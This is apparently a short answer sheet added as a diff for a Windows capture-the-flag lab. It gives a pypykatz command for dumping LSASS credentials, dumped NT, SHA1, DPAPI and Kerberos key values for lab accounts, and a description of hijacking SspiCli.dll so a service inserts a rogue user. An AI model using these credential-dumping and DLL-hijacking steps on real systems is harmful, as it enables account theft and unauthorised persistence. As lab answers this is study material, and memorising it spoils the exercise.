@@ -1,0 +1,22 @@
+1)
+Command: pypykatz lsa minidump lsass.DMP >> lsaDump.txt
+Username: admin_laps
+NT: b49674ecf0ac6dcc0169c6e0e99c726d
+
+2)
+== MSV ==
+	Username: monitoring
+	Domain: winctf
+	LM: NA
+	NT: 2785d316dd37ca24ebb855fcf054c74a
+	SHA1: 2c34d03677b6655ec7c717af3ae12c87aff7b9ce
+	DPAPI: 0801d365140d9bf4be48ffc9b104419a00000000
+	
+== Kerberos ==
+	Username: monitoring
+	Domain: WINCTF.APPSEC.AT
+	AES128 Key: 2785d316dd37ca24ebb855fcf054c74a
+	AES256 Key: 84ddedda83ef2fec84643e992945e47ccc4099894721b1d9fe6f92923fdf0601
+
+3)
+SspiCli.dll was chosen because it got a NAME NOT FOUND status in procmon meaning that it tried to run the dll but failed, and it was also in a writable location aka in this case the same folder as the exe which is really good. Now when the server runs the ftpbasicsvr.exe my homebrewed dll will insert a user into the server database called OscarCarlson.
